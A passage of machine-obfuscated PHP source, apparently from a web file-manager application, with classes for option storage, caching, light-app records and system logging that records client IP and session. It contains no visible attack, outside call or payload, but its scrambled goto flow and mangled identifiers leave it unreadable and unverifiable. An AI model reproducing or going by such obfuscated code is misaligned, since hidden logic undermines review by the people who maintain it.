$aŸ˜óÚÏ Ö = array_merge($aŸ˜óÚÏ Ö, $BÂ‡ÎŒšÜÙ); } goto a„«õ´†…; D¥¥±ÛŸ¥: } public function delete($FÏ ”Û¥ë© = array()) { goto D»Ğ®¥‡¿; A¸Ì¨§ôé‚: return $fá¸²£Û›; goto cÁ‰ÉÕÍ“«; D»Ğ®¥‡¿: $cÙ½†—©Ö¾ =& $_SERVER[¼]; $C£÷‚¦’Ó¤ = self::SQL_WHERE_IN_CHUNK; $B¥Û‰„ß÷ï = $this->optionsValue(); goto e™Ù‚öÍ; e™Ù‚öÍ: $aºŒ—¢¸À— = $this->findWhereField($B¥Û‰„ß÷ï); if (!$aºŒ—¢¸À—) { return parent::delete($FÏ ”Û¥ë©); } $fá¸²£Û› = 0; goto CÙ ÛÎÆãğ; CÙ ÛÎÆãğ: $fÊ†Şù™ç­ = $B¥Û‰„ß÷ï[$cÙ½†—©Ö¾[260]][$aºŒ—¢¸À—][1]; $fÊ†Şù™ç­ = is_array($fÊ†Şù™ç­) ? $fÊ†Şù™ç­ : array(); for ($báöÎá²¢Û = 0; $báöÎá²¢Û < count($fÊ†Şù™ç­); $báöÎá²¢Û += $C£÷‚¦’Ó¤) { $aÄğÔŸ’›ê = array_slice($fÊ†Şù™ç­, $báöÎá²¢Û, $C£÷‚¦’Ó¤); if (!is_array($aÄğÔŸ’›ê) || count($aÄğÔŸ’›ê) == 0) { break; } $B¥Û‰„ß÷ï[$cÙ½†—©Ö¾[260]][$aºŒ—¢¸À—][1] = $aÄğÔŸ’›ê; $this->optionsValue($B¥Û‰„ß÷ï); $fá¸²£Û› += parent::delete($FÏ ”Û¥ë©); } goto A¸Ì¨§ôé‚; cÁ‰ÉÕÍ“«: } private function findWhereField($dÃìô•í†) { $CÁ¿Œğº…Ú =& $_SERVER[¼]; $F…è™İ£“š = self::SQL_WHERE_IN_CHUNK; if (!is_array($dÃìô•í†) || !is_array($dÃìô•í†[$CÁ¿Œğº…Ú[260]])) { return !1; } foreach ($dÃìô•í†[$CÁ¿Œğº…Ú[260]] as $a§éÙšÖÍã => $dªÍ‚„À¯”) { if (is_array($dªÍ‚„À¯”) && isset($dªÍ‚„À¯”[0]) && is_string($dªÍ‚„À¯”[0]) && strtolower($dªÍ‚„À¯”[0]) == $CÁ¿Œğº…Ú[7] && is_array($dªÍ‚„À¯”[1]) && count($dªÍ‚„À¯”[1]) > $F…è™İ£“š) { ignore_timeout(); return $a§éÙšÖÍã; } } return !1; } } class ModelBaseLight { public $optionType = ''; public $modelType = "\x53\171\x73\164\145\x6d\117\160\x74\x69\157\x6e"; public $field = array(); public function listData($A—ğäŒÂ¦Æ = false, $bÜè“¤­¾ = "\x6d\x6f\x64\151\x66\171\124\151\x6d\145", $A¸×º¦´‹ê = false) { $A·ŞÂá°ºŒ = Model($this->modelType)->get(!1, $this->optionType, !0); if (!$A·ŞÂá°ºŒ) { return $A—ğäŒÂ¦Æ ? null : array(); } if (!$A—ğäŒÂ¦Æ) { $A·ŞÂá°ºŒ = array_filter(array_values($A·ŞÂá°ºŒ)); return array_sort_by($A·ŞÂá°ºŒ, $bÜè“¤­¾, $A¸×º¦´‹ê); } return $A·ŞÂá°ºŒ[$_SERVER[¼][361] . $A—ğäŒÂ¦Æ]; } public function insert($Eğ¤à˜¿Ëó) { goto F’§§õ§À¸; AÔìÃ„ŒØ•: return $D×‚œ¾Ç¸„; goto c·Ğ†œ¤É¼; F’§§õ§À¸: $c†Í´ƒåİÄ =& $_SERVER[¼]; $Eğ¤à˜¿Ëó = array_field_key($Eğ¤à˜¿Ëó, $this->field); $D×‚œ¾Ç¸„ = Model($this->modelType)->get($c†Í´ƒåİÄ[362], $this->optionType . $c†Í´ƒåİÄ[363]); goto B‹Ô¢æ¼ò¼; d›íÙ˜ë·: $Eğ¤à˜¿Ëó[$c†Í´ƒåİÄ[107]] = time(); Model($this->modelType)->set($c†Í´ƒåİÄ[362], $D×‚œ¾Ç¸„, $this->optionType . $c†Í´ƒåİÄ[363]); Model($this->modelType)->set($c†Í´ƒåİÄ[361] . $D×‚œ¾Ç¸„, $Eğ¤à˜¿Ëó, $this->optionType); goto AÔìÃ„ŒØ•; B‹Ô¢æ¼ò¼: $D×‚œ¾Ç¸„ = $D×‚œ¾Ç¸„ ? $D×‚œ¾Ç¸„ : 0; $Eğ¤à˜¿Ëó[$c†Í´ƒåİÄ[364]] = ++$D×‚œ¾Ç¸„; $Eğ¤à˜¿Ëó[$c†Í´ƒåİÄ[184]] = time(); goto d›íÙ˜ë·; c·Ğ†œ¤É¼: } public function update($E±ğğ„•…, $f”“Šº•—œ) { goto A‰òŸŞ­›; A‰òŸŞ­›: $F×‰Õ¬Ê =& $_SERVER[¼]; $f”“Šº•—œ = array_field_key($f”“Šº•—œ, $this->field); $AÏÑ¬ˆ¨½ = $this->listData($E±ğğ„•…); goto FÈ¦˜³ÑöÎ; bá‰ˆñŞ¶ó: return Model($this->modelType)->set($F×‰Õ¬Ê[361] . $E±ğğ„•…, $f”“Šº•—œ, $this->optionType); goto bÕ»—ğ®Ö‘; FÈ¦˜³ÑöÎ: if (!$AÏÑ¬ˆ¨½) { return !1; } $f”“Šº•—œ = array_merge($AÏÑ¬ˆ¨½, $f”“Šº•—œ); $f”“Šº•—œ[$F×‰Õ¬Ê[107]] = time(); goto bá‰ˆñŞ¶ó; bÕ»—ğ®Ö‘: } public function remove($dñ½­îµ‚) { return Model($this->modelType)->remove($_SERVER[¼][361] . $dñ½­îµ‚, $this->optionType); } public function clear() { $cÈØŞëÖ =& $_SERVER[¼]; Model($this->modelType)->remove($cÈØŞëÖ[362], $this->optionType . $cÈØŞëÖ[363]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($eßÊ’®–‹–, $DğºéÅ›ïÊ) { if (!$DğºéÅ›ïÊ) { return !1; } $c›ŸÛØÍâÆ = $this->listData(); $c›ŸÛØÍâÆ = array_to_keyvalue($c›ŸÛØÍâÆ, $eßÊ’®–‹–); return isset($c›ŸÛØÍâÆ[$DğºéÅ›ïÊ]) ? $c›ŸÛØÍâÆ[$DğºéÅ›ïÊ] : !1; } public function findByName($dš­ëãá§) { return $this->findByKey($_SERVER[¼][28], $dš­ëãá§); } protected function resetData($dê®¡õ¨è) { $d§áÓæµ‹À =& $_SERVER[¼]; $dê®¡õ¨è = is_array($dê®¡õ¨è) ? $dê®¡õ¨è : array(); $Eá…ÊÆ²± = array(); for ($e…¤±ëìÌ = 0; $e…¤±ëìÌ < count($dê®¡õ¨è); $e…¤±ëìÌ++) { $Eá…ÊÆ²±[$d§áÓæµ‹À[361] . $dê®¡õ¨è[$e…¤±ëìÌ][$d§áÓæµ‹À[364]]] = $dê®¡õ¨è[$e…¤±ëìÌ]; } return Model($this->modelType)->set($Eá…ÊÆ²±, !1, $this->optionType); } private function getAutoName($B²‹Ş¨ê˜) { $bÄ‹èÅ‰ŠÒ = array_to_keyvalue($this->listData(), $_SERVER[¼][28]); if (!$bÄ‹èÅ‰ŠÒ || !isset($bÄ‹èÅ‰ŠÒ[$B²‹Ş¨ê˜])) { return $B²‹Ş¨ê˜; } for ($eª´ÄË£ºò = 1; $eª´ÄË£ºò < count($bÄ‹èÅ‰ŠÒ); $eª´ÄË£ºò++) { $b‘©§‚Éº = $B²‹Ş¨ê˜ . "\50{$eª´ÄË£ºò}\x29"; if (!isset($bÄ‹èÅ‰ŠÒ[$b‘©§‚Éº])) { return $b‘©§‚Éº; } } return $b‘©§‚Éº; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($E‘½¦…¥‰º = false, $aÆËœ„Ê÷Š = '', $B·è÷â¸½× = false) { goto eÙŸí““½õ; eÚ‰…”‘: $f¼³š‰©íß = is_array($f¼³š‰©íß) ? $f¼³š‰©íß : array(); if (is_array($f©¢†’äÉ)) { $f©¢†’äÉ = array_merge($f¼³š‰©íß, $f©¢†’äÉ); return $E‘½¦…¥‰º ? isset($f©¢†’äÉ[$E‘½¦…¥‰º]) ? $f©¢†’äÉ[$E‘½¦…¥‰º] : null : $f©¢†’äÉ; } $Aø‹’œÍÛ = $this->filterWhere(array($bƒµ£¬Ø…„[29] => $aÆËœ„Ê÷Š)); goto D ‚…ƒÌ§Ğ; eÙŸí““½õ: $bƒµ£¬Ø…„ =& $_SERVER[¼]; $f©¢†’äÉ = $this->cacheGet($aÆËœ„Ê÷Š); $f¼³š‰©íß = $this->optionDefault($aÆËœ„Ê÷Š); goto eÚ‰…”‘; D ‚…ƒÌ§Ğ: $f©¢†’äÉ = $this->where($Aø‹’œÍÛ)->select(); $f©¢†’äÉ = array_to_keyvalue($f©¢†’äÉ, $bƒµ£¬Ø…„[89], $bƒµ£¬Ø…„[356]); foreach ($f©¢†’äÉ as $F‘·‰ÏÖ§Ô => $C’ëçˆ¿ò) { if ($B·è÷â¸½× || in_array($F‘·‰ÏÖ§Ô, $this->jsonField)) { $f©¢†’äÉ[$F‘·‰ÏÖ§Ô] = json_decode($C’ëçˆ¿ò, !0); } } goto fµÑÓ›’«; fµÑÓ›’«: $this->cacheSet($aÆËœ„Ê÷Š, $f©¢†’äÉ); $f©¢†’äÉ = array_merge($f¼³š‰©íß, $f©¢†’äÉ); return $E‘½¦…¥‰º ? $f©¢†’äÉ[$E‘½¦…¥‰º] : $f©¢†’äÉ; goto FĞÄÎ‚¯Šù; FĞÄÎ‚¯Šù: } public function set($F·¤ÛĞÂ‹, $d”ƒß«ˆŒ‹ = false, $A»¨™ÉÂÕË = '') { goto eÉ£•ÂĞŠä; B«ÓË÷’êù: $b‹…òÚÅŒá = is_array($F·¤ÛĞÂ‹) ? $F·¤ÛĞÂ‹ : array($F·¤ÛĞÂ‹ => $d”ƒß«ˆŒ‹); foreach ($b‹…òÚÅŒá as $fä©îˆ”ó => $AùÏ„¡ŠÇ) { if (is_array($AùÏ„¡ŠÇ)) { $AùÏ„¡ŠÇ = json_encode_force($AùÏ„¡ŠÇ); } $this->checkLength($AùÏ„¡ŠÇ, !1, $this->tableName . $BõÄãé®¢‡[4] . $F·¤ÛĞÂ‹); $AùÏ„¡ŠÇ = self::textEncode($AùÏ„¡ŠÇ); $b‹…òÚÅŒá = array($BõÄãé®¢‡[29] => $A»¨™ÉÂÕË, $BõÄãé®¢‡[89] => $fä©îˆ”ó, $BõÄãé®¢‡[356] => $AùÏ„¡ŠÇ); $e…â‡¥İé[] = $this->filterWhere($b‹…òÚÅŒá); } if (!$e…â‡¥İé) { return !0; } goto cÑ¬’¯º»„; cÑ¬’¯º»„: return $this->addAll($e…â‡¥İé, array(), !0); goto f¤Û±×–¿ô; eÉ£•ÂĞŠä: $BõÄãé®¢‡ =& $_SERVER[¼]; $this->cacheRemove($A»¨™ÉÂÕË); $e…â‡¥İé = array(); goto B«ÓË÷’êù; f¤Û±×–¿ô: } protected function optionDefault($a°¤ÛåÏ = '') { return !1; } public function setDeep($E¬Åô ö², $aĞ¥‰Œ—± = false, $e¶÷˜ÌŞ’ = '') { $dÕô×Åé™ = explode($_SERVER[¼][93], $E¬Åô ö²); $dŞ«†Ú«¸´ = $this->get(); array_set_value($dŞ«†Ú«¸´, $E¬Åô ö², $aĞ¥‰Œ—±); $this->set($dÕô×Åé™[0], $dŞ«†Ú«¸´[$dÕô×Åé™[0]], $e¶÷˜ÌŞ’); } public function remove($Fïœ·ò­éø, $có‘¾²Î°Æ = '') { $d¼ëÍ›³ù =& $_SERVER[¼]; $this->cacheRemove($có‘¾²Î°Æ); $d±Ò¾ğà¢ê = $this->filterWhere(array($d¼ëÍ›³ù[89] => $Fïœ·ò­éø, $d¼ëÍ›³ù[29] => $có‘¾²Î°Æ)); if (is_null($Fïœ·ò­éø)) { unset($d±Ò¾ğà¢ê[$d¼ëÍ›³ù[89]]); } return $this->where($d±Ò¾ğà¢ê)->delete(); } public function cacheSet($e”‚×É‹—½, $DäÌ ­ƒ‹½ = false) { return Cache::set($this->cacheKey($e”‚×É‹—½), $DäÌ ­ƒ‹½); } public function cacheGet($e—í‡â‰Ğª) { return Cache::get($this->cacheKey($e—í‡â‰Ğª)); } public function cacheRemove($càã¹…•Ü) { return Cache::remove($this->cacheKey($càã¹…•Ü)); } protected function filterWhere($DÁÈ‚Š¾È) { return $DÁÈ‚Š¾È; } protected function cacheKey($cÅ‹Ÿ‡ìÛÄ) { return $cÅ‹Ÿ‡ìÛÄ; } } goto bôäùØëà·; bºìÆ„ƒÍ: define($_SERVER[¼][224], 2); define($_SERVER[¼][225], 3); define($_SERVER[¼][226], 1); goto dáÉèî•ò; a÷ó¸¡ï²×: define($_SERVER[¼][1896], 2); define($_SERVER[¼][1897], 3); define($_SERVER[¼][1898], 4); goto Eó“èÏ”²; E²ÒËº§‡¼: class SystemLightAppModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\164\x65\x6d\56\x4c\151\x67\150\164\x41\x70\160"; public $modelType = "\123\x79\163\x74\x65\x6d\x4f\160\164\151\x6f\x6e"; public $field = array("\x6e\141\155\x65", "\147\x72\x6f\165\x70", "\x64\x65\x73\143", "\143\x6f\156\x74\x65\156\x74"); public function listData($AÄ¥¥ñŞ—¤ = false, $Fäš›²Šà = "\155\x6f\144\x69\146\171\x54\x69\x6d\145", $BÅ×¼ù·ù– = true) { return parent::listData($AÄ¥¥ñŞ—¤, $Fäš›²Šà, $BÅ×¼ù·ù–); } public function remove($e‰´æ·ÂºĞ) { $Aßæ³®’×ö = $this->findByName($e‰´æ·ÂºĞ); if (!$Aßæ³®’×ö) { return !1; } return parent::remove($Aßæ³®’×ö[$_SERVER[¼][364]]); } public function add($BÖÑ«õÌ) { if ($this->findByName($BÖÑ«õÌ[$_SERVER[¼][28]])) { return !1; } return parent::insert($BÖÑ«õÌ); } public function update($Fùƒ‚Ññ†ç, $b¹İ¨÷©„ğ) { $F°¾ªÅŠ½’ =& $_SERVER[¼]; $BÍĞ‰´Ğ = $this->findByName($Fùƒ‚Ññ†ç); $Fˆâ»åå¨ = $this->findByName($b¹İ¨÷©„ğ[$F°¾ªÅŠ½’[28]]); if (!$BÍĞ‰´Ğ || $Fˆâ»åå¨ && $Fˆâ»åå¨[$F°¾ªÅŠ½’[364]] != $BÍĞ‰´Ğ[$F°¾ªÅŠ½’[364]]) { return !1; } return parent::update($BÍĞ‰´Ğ[$F°¾ªÅŠ½’[364]], $b¹İ¨÷©„ğ); } } class SystemLogModel extends ModelBase { protected $tableName = "\x73\x79\x73\164\145\155\137\154\x6f\147"; protected $dataAuto = array(array("\143\162\x65\141\x74\145\124\x69\x6d\145", "\164\x69\155\145", "\x69\x6e\163\145\162\164", "\146\x75\x6e\143\x74\x69\x6f\156")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->allTypeList(); } public function allTypeList() { $b‰²ºàÍ² =& $_SERVER[¼]; return array($b‰²ºàÍ²[2331] => LNG($b‰²ºàÍ²[2332]), $b‰²ºàÍ²[2333] => LNG($b‰²ºàÍ²[2334]), $b‰²ºàÍ²[2007] => LNG($b‰²ºàÍ²[2335]), $b‰²ºàÍ²[2336] => LNG($b‰²ºàÍ²[2337]), $b‰²ºàÍ²[2338] => LNG($b‰²ºàÍ²[2339]), $b‰²ºàÍ²[2340] => LNG($b‰²ºàÍ²[2341]), $b‰²ºàÍ²[2342] => LNG($b‰²ºàÍ²[2343]), $b‰²ºàÍ²[2344] => LNG($b‰²ºàÍ²[2345]), $b‰²ºàÍ²[2038] => LNG($b‰²ºàÍ²[2346]), $b‰²ºàÍ²[2039] => LNG($b‰²ºàÍ²[2347]), $b‰²ºàÍ²[2348] => LNG($b‰²ºàÍ²[2349]), $b‰²ºàÍ²[2350] => LNG($b‰²ºàÍ²[2351]), $b‰²ºàÍ²[2352] => LNG($b‰²ºàÍ²[2353]), $b‰²ºàÍ²[2354] => LNG($b‰²ºàÍ²[2355]), $b‰²ºàÍ²[2036] => LNG($b‰²ºàÍ²[2356]), $b‰²ºàÍ²[2042] => LNG($b‰²ºàÍ²[2357]), $b‰²ºàÍ²[2358] => LNG($b‰²ºàÍ²[2359]), $b‰²ºàÍ²[2360] => LNG($b‰²ºàÍ²[2361]), $b‰²ºàÍ²[2362] => LNG($b‰²ºàÍ²[2363]), $b‰²ºàÍ²[2364] => LNG($b‰²ºàÍ²[2365]), $b‰²ºàÍ²[2045] => LNG($b‰²ºàÍ²[2366]), $b‰²ºàÍ²[2046] => LNG($b‰²ºàÍ²[2367]), $b‰²ºàÍ²[2368] => LNG($b‰²ºàÍ²[2369]), $b‰²ºàÍ²[2370] => LNG($b‰²ºàÍ²[2371]), $b‰²ºàÍ²[2372] => LNG($b‰²ºàÍ²[2373]), $b‰²ºàÍ²[2374] => LNG($b‰²ºàÍ²[2375]), $b‰²ºàÍ²[2376] => LNG($b‰²ºàÍ²[2377]), $b‰²ºàÍ²[2040] => LNG($b‰²ºàÍ²[2378]), $b‰²ºàÍ²[2379] => LNG($b‰²ºàÍ²[2380]), $b‰²ºàÍ²[2381] => LNG($b‰²ºàÍ²[2382]), $b‰²ºàÍ²[2383] => LNG($b‰²ºàÍ²[2383]), $b‰²ºàÍ²[2384] => LNG($b‰²ºàÍ²[2011]), $b‰²ºàÍ²[2385] => LNG($b‰²ºàÍ²[2386]), $b‰²ºàÍ²[2387] => LNG($b‰²ºàÍ²[2388]), $b‰²ºàÍ²[2389] => LNG($b‰²ºàÍ²[2390]), $b‰²ºàÍ²[2391] => LNG($b‰²ºàÍ²[2392]), $b‰²ºàÍ²[2393] => LNG($b‰²ºàÍ²[2393]), $b‰²ºàÍ²[2394] => LNG($b‰²ºàÍ²[2395]), $b‰²ºàÍ²[2396] => LNG($b‰²ºàÍ²[2397]), $b‰²ºàÍ²[2398] => LNG($b‰²ºàÍ²[2399]), $b‰²ºàÍ²[2400] => LNG($b‰²ºàÍ²[2401]), $b‰²ºàÍ²[2402] => LNG($b‰²ºàÍ²[2403]), $b‰²ºàÍ²[2404] => LNG($b‰²ºàÍ²[2405])); } private function typeFile() { $E³ÖİÕœ¢Ï =& $_SERVER[¼]; $dÀ‡÷…Ü¼» = array($E³ÖİÕœ¢Ï[2042] => array($E³ÖİÕœ¢Ï[2043]), $E³ÖİÕœ¢Ï[2352] => array($E³ÖİÕœ¢Ï[2406]), $E³ÖİÕœ¢Ï[2354] => array($E³ÖİÕœ¢Ï[2407]), $E³ÖİÕœ¢Ï[2036] => array($E³ÖİÕœ¢Ï[2037]), $E³ÖİÕœ¢Ï[2360] => array(), $E³ÖİÕœ¢Ï[2362] => array(), $E³ÖİÕœ¢Ï[2364] => array(), $E³ÖİÕœ¢Ï[2045] => array($E³ÖİÕœ¢Ï[2047]), $E³ÖİÕœ¢Ï[2046] => array($E³ÖİÕœ¢Ï[2047]), $E³ÖİÕœ¢Ï[2368] => array($E³ÖİÕœ¢Ï[2408]), $E³ÖİÕœ¢Ï[2370] => array($E³ÖİÕœ¢Ï[2408]), $E³ÖİÕœ¢Ï[2372] => array($E³ÖİÕœ¢Ï[2409]), $E³ÖİÕœ¢Ï[2358] => array($E³ÖİÕœ¢Ï[2410]), $E³ÖİÕœ¢Ï[2374] => array($E³ÖİÕœ¢Ï[2411]), $E³ÖİÕœ¢Ï[2376] => array($E³ÖİÕœ¢Ï[2412]), $E³ÖİÕœ¢Ï[2040] => array($E³ÖİÕœ¢Ï[2041])); return $dÀ‡÷…Ü¼»; } private function typeAll() { goto D­ÙÂµï; D­ÙÂµï: $c‹è‡·ã› =& $_SERVER[¼]; $c”ß’æ¦ÂÒ = $this->typeList; $A°­“‹á = array_filter($this->typeFile()); goto aØ‘ñôƒ½; bÒõ¼³íê: return $c”ß’æ¦ÂÒ; goto dó‘Ó™áš; aØ‘ñôƒ½: foreach ($A°­“‹á as $c÷™§×ù† => $fÏ¬†éİİ‰) { $c”ß’æ¦ÂÒ[$fÏ¬†éİİ‰[0]] = $c”ß’æ¦ÂÒ[$c÷™§×ù†]; } $c”ß’æ¦ÂÒ[$c‹è‡·ã›[2047]] = LNG($c‹è‡·ã›[2413]); $c”ß’æ¦ÂÒ[$c‹è‡·ã›[2408]] = LNG($c‹è‡·ã›[2414]); goto bÒõ¼³íê; dó‘Ó™áš: } public function addLog($eëÉ…»—ƒ“, $fƒÒàÌŠ¨Ó = array()) { goto cÚñ™‚ß‹; BË›ˆšàõ: parent::add($fƒÒàÌŠ¨Ó); goto e³ùƒÌİƒ; e³Êº³‚é: $E£È‘±¡ = get_client_ip(); if (!$fƒÒàÌŠ¨Ó || strlen(json_encode($fƒÒàÌŠ¨Ó)) >= 1024) { $fƒÒàÌŠ¨Ó = array($dÛÏğùìÂò[2415] => $E£È‘±¡); } else { if (is_array($fƒÒàÌŠ¨Ó)) { $fƒÒàÌŠ¨Ó[$dÛÏğùìÂò[2415]] = $E£È‘±¡; } else { $fƒÒàÌŠ¨Ó = array($dÛÏğùìÂò[1027] => $fƒÒàÌŠ¨Ó, $dÛÏğùìÂò[2415] => $E£È‘±¡); } } $fƒÒàÌŠ¨Ó = array($dÛÏğùìÂò[1394] => Session::sign(), $dÛÏğùìÂò[1395] => $bÖµÔË‰À, $dÛÏğùìÂò[29] => $eëÉ…»—ƒ“, $dÛÏğùìÂò[1397] => json_encode($fƒÒàÌŠ¨Ó)); goto BË›ˆšàõ; cÚñ™‚ß‹: $dÛÏğùìÂò =& $_SERVER[¼]; if (!isset($this->typeList[$eëÉ…»—ƒ“])) { return; } $bÖµÔË‰À = USER_ID ? USER_ID : (isset($fƒÒàÌŠ¨Ó[$dÛÏğùìÂò[1404]]) ? $fƒÒàÌŠ¨Ó[$dÛÏğùìÂò[1404]] : 0); goto e³Êº³‚é; e³ùƒÌİƒ: } public function remove($DÛßºÓÁ‰…) { $this->where(array($_SERVER[¼][382] => $DÛßºÓÁ‰…))->delete(); } private function _makeOrder($Cš¡ºİÜ¾Ø = '') { goto aŒßé¨‹Ë; f•‹ã‹†ºÂ: return $this->order($Cš¡ºİÜ¾Ø); goto AŠñ„Øó„Ë; aŒßé¨‹Ë: $BÅç¤¢²¯ =& $_SERVER[¼]; $bÙ“¬ì‹Íƒ = $BÅç¤¢²¯[184]; $c•¨§Š‰Ù = array($BÅç¤¢²¯[398] => $BÅç¤¢²¯[399], $BÅç¤¢²¯[400] => $BÅç¤¢²¯[401]); goto AİÅ’×¯; AİÅ’×¯: $DˆÑµìâ = Input::get($BÅç¤¢²¯[404], $BÅç¤¢²¯[7], $BÅç¤¢²¯[2205], array($BÅç¤¢²¯[2142], $BÅç¤¢²¯[400])); $DˆÑµìâ = $c•¨§Š‰Ù[$DˆÑµìâ]; $Cš¡ºİÜ¾Ø = $Cš¡ºİÜ¾Ø . "{$bÙ“¬ì‹Íƒ}\x20{$DˆÑµìâ}"; goto f•‹ã‹†ºÂ; AŠñ„Øó„Ë: } public function get($b—ã›†µßù = '') { goto a²”»µ ˜°; C«Áó¨Óåƒ: if ($b—ã›†µßù[$aÎÇ»˜³†[1404]]) { $fòƒÊÕøí[$aÎÇ»˜³†[1404]] = $b—ã›†µßù[$aÎÇ»˜³†[1404]]; } if (isset($b—ã›†µßù[$aÎÇ»˜³†[694]])) { $D´—‡›‚³ = $b—ã›†µßù[$aÎÇ»˜³†[694]]; $fîŠîÁ‘İ = isset($b—ã›†µßù[$aÎÇ»˜³†[695]]) ? $b—ã›†µßù[$aÎÇ»˜³†[695]] : time(); $fòƒÊÕøí[$aÎÇ»˜³†[184]] = array($aÎÇ»˜³†[318], array($D´—‡›‚³, $fîŠîÁ‘İ)); } if ($b—ã›†µßù[$aÎÇ»˜³†[29]]) { $bÒğ§¤„Î = explode($aÎÇ»˜³†[47], $b—ã›†µßù[$aÎÇ»˜³†[29]]); $DŞë“ÌŒ¿‘ = $this->typeFile(); $Eòùè×ä´­ = array(); foreach ($bÒğ§¤„Î as $eİôŠ·¼) { $Eòùè×ä´­[] = $eİôŠ·¼; if (isset($DŞë“ÌŒ¿‘[$eİôŠ·¼])) { $Eòùè×ä´­ = array_merge($Eòùè×ä´­, $DŞë“ÌŒ¿‘[$eİôŠ·¼]); } } $Eòùè×ä´­ = array_unique($Eòùè×ä´­); if ($Eòùè×ä´­) { $fòƒÊÕøí[$aÎÇ»˜³†[29]] = array($aÎÇ»˜³†[7], $Eòùè×ä´­); } } goto a¨…’ÅÊ; A¼¶Äø¹Ç : $a‘ÇËˆ¸ƒô[$aÎÇ»˜³†[351]] = $this->logList($a‘ÇËˆ¸ƒô[$aÎÇ»˜³†[351]]); return $a‘ÇËˆ¸ƒô; goto D¥ÄáèÜ²÷; a²”»µ ˜°: $aÎÇ»˜³† =& $_SERVER[¼]; if (!$b—ã›†µßù) { show_json(array()); } $fòƒÊÕøí = array(); goto C«Áó¨Óåƒ; a¨…’ÅÊ: if (!empty($b—ã›†µßù[$aÎÇ»˜³†[2415]])) { $fòƒÊÕøí[$aÎÇ»˜³†[401]] = array($aÎÇ»˜³†[743], "\45{$b—ã›†µßù[$aÎÇ»˜³†[2415]]}\x25"); } $a‘ÇËˆ¸ƒô = $this->_makeOrder()->where($fòƒÊÕøí)->selectPage(); if (empty($a‘ÇËˆ¸ƒô[$aÎÇ»˜³†[351]])) { show_json(array(), !0, $a‘ÇËˆ¸ƒô[$aÎÇ»˜³†[348]]); } goto A¼¶Äø¹Ç ; D¥ÄáèÜ²÷: } private function ipAddress(&$Bâ¥„¦¥³) { $f¹“®İõ¢ø =& $_SERVER[¼]; if (!empty($Bâ¥„¦¥³[$f¹“®İõ¢ø[2415]])) { $A‡»ó©£Ø’ = IpLocation::get($Bâ¥„¦¥³[$f¹“®İõ¢ø[2415]]); if ($A‡»ó©£Ø’ == $f¹“®İõ¢ø[2416]) { $A‡»ó©£Ø’ = $f¹“®İõ¢ø[2417]; } } else { $A‡»ó©£Ø’ = LNG($f¹“®İõ¢ø[2418]); } $Bâ¥„¦¥³[$f¹“®İõ¢ø[2419]] = $A‡»ó©£Ø’; } private function descZipDownload($d³ùÛÏ»Ë§, &$e“˜ò¨²ƒ˜) { $D¯­Ã¶ŒÚ† =& $_SERVER[¼]; if (!isset($d³ùÛÏ»Ë§[$D¯­Ã¶ŒÚ†[2420]])) { return; } $c¾ŒË¸§ƒ = json_decode($d³ùÛÏ»Ë§[$D¯­Ã¶ŒÚ†[2420]], !0); foreach ($c¾ŒË¸§ƒ as $F¯²‡ùÖ’æ) { if (!IO::init($F¯²‡ùÖ’æ[$D¯­Ã¶ŒÚ†[75]])) { continue; } if (!($d¨œñÚ‘Ì = IO::infoFull($F¯²‡ùÖ’æ[$D¯­Ã¶ŒÚ†[75]]))) { continue; } $d³ùÛÏ»Ë§[$D¯­Ã¶ŒÚ†[75]] = $F¯²‡ùÖ’æ[$D¯­Ã¶ŒÚ†[75]]; $e“˜ò¨²ƒ˜[] = $d³ùÛÏ»Ë§[$D¯­Ã¶ŒÚ†[366]] = $d¨œñÚ‘Ì[$D¯­Ã¶ŒÚ†[366]]; $e“˜ò¨²ƒ˜[] = $d³ùÛÏ»Ë§[$D¯­Ã¶ŒÚ†[2238]] = $d¨œñÚ‘Ì[$D¯­Ã¶ŒÚ†[457]]; break; } return $d³ùÛÏ»Ë§; } private function getSourceList(&$f„˜–´ğ†Î) { $C”²¦ëº¥ä =& $_SERVER[¼]; $e¨‹Õíà™… = array(); foreach ($f„˜–´ğ†Î as $c‰Õİ«½æ => $eÈã„ §·Å) { goto F„ùŠ ¯®; BÃãêÅ“‘: $e¨‹Õíà™…[] = $EªÒ¦Å¬‘Ğ[$C”²¦ëº¥ä[366]]; $e¨‹Õíà™…[] = $EªÒ¦Å¬‘Ğ[$C”²¦ëº¥ä[2238]]; if ($EªÒ¦Å¬‘Ğ[$C”²¦ëº¥ä[29]] == $C”²¦ëº¥ä[488]) { $e¨‹Õíà™…[] = $EªÒ¦Å¬‘Ğ[$C”²¦ëº¥ä[401]][$C”²¦ëº¥ä[999]]; $e¨‹Õíà™…[] = $EªÒ¦Å¬‘Ğ[$C”²¦ëº¥ä[401]][$C”²¦ëº¥ä[1000]]; } goto CÃö”÷×àé; F„ùŠ ¯®: $EªÒ¦Å¬‘Ğ = json_decode($eÈã„ §·Å[$C”²¦ëº¥ä[401]], !0); if ($eÈã„ §·Å[$C”²¦ëº¥ä[29]] == $C”²¦ëº¥ä[2039]) { $EªÒ¦Å¬‘Ğ = $this->descZipDownload($EªÒ¦Å¬‘Ğ, $e¨‹Õíà™…); $f„˜–´ğ†Î[$c‰Õİ«½æ][$C”²¦ëº¥ä[401]] = json_encode($EªÒ¦Å¬‘Ğ); continue; } if (strpos($eÈã„ §·Å[$C”²¦ëº¥ä[29]], $C”²¦ëº¥ä[2239]) !== 0) { goto E¢ì¹Öàç‡; A¸Ş”º±Üê: continue; goto F¥ªáø¤Îˆ; E¢ì¹Öàç‡: if (!isset($EªÒ¦Å¬‘Ğ[$C”²¦ëº¥ä[75]]) || strpos($eÈã„ §·Å[$C”²¦ëº¥ä[29]], $C”²¦ëº¥ä[2421]) !== 0) { continue; } if (!IO::init($EªÒ¦Å¬‘Ğ[$C”²¦ëº¥ä[75]])) { continue; } if (!($fŞ–îÜÔ•Œ = IO::infoFull($EªÒ¦Å¬‘Ğ[$C”²¦ëº¥ä[75]]))) { continue; } goto Fè¦“¬®Íñ; Fè¦“¬®Íñ: $e¨‹Õíà™…[] = $EªÒ¦Å¬‘Ğ[$C”²¦ëº¥ä[366]] = $fŞ–îÜÔ•Œ[$C”²¦ëº¥ä[366]]; $e¨‹Õíà™…[] = $EªÒ¦Å¬‘Ğ[$C”²¦ëº¥ä[2238]] = $fŞ–îÜÔ•Œ[$C”²¦ëº¥ä[457]]; 